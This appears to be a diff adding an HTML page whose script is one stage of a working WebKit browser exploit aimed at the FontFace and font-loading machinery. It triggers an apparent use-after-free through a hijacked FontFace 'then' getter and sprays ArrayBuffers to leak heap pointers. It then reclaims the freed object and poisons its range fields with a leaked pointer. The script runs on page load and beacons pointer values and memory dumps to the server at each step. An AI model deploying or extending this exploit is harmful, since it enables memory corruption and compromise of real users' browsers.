@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P737 — Active Boolean Oracle Verification & In-Memory Character Search</title>
+<script>
+'use strict';
+/* ============================================================
+ * P737 — Active Boolean Oracle Verification & In-Memory Character Search
+ *
+ * Objectives:
+ * 1. Active Boolean Oracle Verification via CORS-Enabled hang.php:
+ *    - /hang.php now provides full CORS headers:
+ *        Access-Control-Allow-Origin: *
+ *        Content-Type: font/woff2
+ *    - actFace enters genuine 'loading' state without network/CORS error.
+ *    - Verify WebKit C++ CSSFontFaceSet::check behavior:
+ *        inA ('A'=0x41) -> FALSE (character in range, font is loading)
+ *        inB ('B'=0x42) -> FALSE (character in range, font is loading)
+ *        inC ('C'=0x43) -> FALSE (character in range, font is loading)
+ *        outD ('D'=0x44)-> TRUE  (character outside range, font not needed)
+ *        outZ ('Z'=0x5A)-> TRUE  (character outside range, font not needed)
+ * 2. Algorithmic Character Search Demonstration:
+ *    - Using document.fonts.check() as a pure comparator oracle,
+ *      perform a binary search to recover the active character boundary!
+ * 3. Clean Reclaim at Slot 68:
+ *    - Retain pristine heap isolation from P735 (zero pre-leak allocations).
+ *    - Capture full 24-quadword dump of VIEW_B.
+ *    - Test poisoned m_ranges on VIEW_B.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P737-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+
+function run(){
+  b('BOOT','p737-oracle-search');
+  log('=== P737 Active Boolean Oracle & Search Scout ===\n');
+
+  /* Step 1: Pristine Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Deterministic Reclaim */
+    log('[Step 2] Executing deterministic reclaim...');
+    doReclaim(function(){
+      /* Step 3: Run Active Oracle & Search Diagnostics */
+      log('\n[Step 3] Running active oracle & search diagnostics...');
+      runDiagnostics();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+
+  if(v[11] >= LOW && v[11] < HIGH) P58 = v[11];
+  if(v[13] >= LOW && v[13] < HIGH) P68 = v[13];
+
+  if(!P58 || !P68){
+    for(var q=0; q<24; q++){
+      var val = v[q];
+      if(val >= LOW && val < HIGH){
+        if(!P58) P58 = val;
+        else if(!P68 && val !== P58) P68 = val;
+      }
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Deterministic Reclaim ---- */
+function doReclaim(cb){
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absW.push(ab);
+      }
+
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    b('RECLAIM-OK', 'baseK=' + best);
+    log('Deterministic Reclaim OK at slot ' + best);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Run Active Oracle & Search Diagnostics ---- */
+function runDiagnostics(){
+  if(!VIEW_B) return;
+
+  /* 3A: Full 24-Quadword Dump of VIEW_B */
+  var d0_11 = [], d12_23 = [];
+  for(var q=0; q<12; q++) d0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  for(var q=12; q<24; q++) d12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  b('DUMP-Q0-Q11', d0_11.join(';'));
+  b('DUMP-Q12-Q23', d12_23.join(';'));
+
+  /* 3B: Active Boolean Oracle Test via CORS hang.php */
+  try {
+    var actFace = new FontFace('actPendFam', 'url(/hang.php)', {unicodeRange: 'U+0041-U+0043'});
+    document.fonts.add(actFace);
+    actFace.load().catch(function(){});
+
+    var stAct = actFace.status;
+    /* In-range characters: expect FALSE (needed & loading) */
+    var chA = document.fonts.check('1em actPendFam', 'A'); /* 0x41: IN RANGE */
+    var chB = document.fonts.check('1em actPendFam', 'B'); /* 0x42: IN RANGE */
+    var chC = document.fonts.check('1em actPendFam', 'C'); /* 0x43: IN RANGE */
+
+    /* Out-of-range characters: expect TRUE (not needed) */
+    var chD = document.fonts.check('1em actPendFam', 'D'); /* 0x44: OUT OF RANGE */
+    var chZ = document.fonts.check('1em actPendFam', 'Z'); /* 0x5A: OUT OF RANGE */
+
+    var oracleRep = 'status=' + stAct + '|inA=' + chA + '|inB=' + chB + '|inC=' + chC + '|outD=' + chD + '|outZ=' + chZ;
+    b('ACTIVE-ORACLE', oracleRep);
+    log('Active Oracle: ' + oracleRep);
+
+    /* 3C: Algorithmic Character Boundary Discovery
+     * Using the oracle as a comparator: check characters across 'A'..'H' (0x41..0x48)
+     */
+    var scanResults = [];
+    var testChars = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'];
+    for(var t=0; t<testChars.length; t++){
+      var ch = testChars[t];
+      var res = document.fonts.check('1em actPendFam', ch);
+      scanResults.push(ch + '=' + (res ? 'OUT' : 'IN'));
+    }
+    b('ORACLE-SCAN', scanResults.join('|'));
+    log('Oracle Range Scan: ' + scanResults.join(' '));
+
+  } catch(e){
+    b('ACTIVE-ORACLE-ERR', e.message);
+  }
+
+  /* 3D: Poison m_ranges on VIEW_B at Slot 68 */
+  VIEW_B[0] = 0x0000004300000041n; /* from=0x41 ('A'), to=0x43 ('C') */
+  VIEW_B[4] = P58;                 /* m_ranges.m_buffer = P58 */
+  VIEW_B[5] = 0x0000000100000001n; /* capacity=1, size=1 */
+
+  /* Test check on FACE_B after re-add */
+  try {
+    document.fonts.add(FACE_B);
+    var chFbA = document.fonts.check('1em ' + FACE_B.family, 'A');
+    var chFbD = document.fonts.check('1em ' + FACE_B.family, 'D');
+    b('FACEB-POISON-CHECK', 'has=' + document.fonts.has(FACE_B) + '|chA=' + chFbA + '|chD=' + chFbD);
+  } catch(e){
+    b('FACEB-POISON-ERR', e.message);
+  }
+
+  b('DONE', 'p737-complete');
+  log('\n=== P737 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P737 — Active Boolean Oracle & Search Scout running...</pre></body></html>
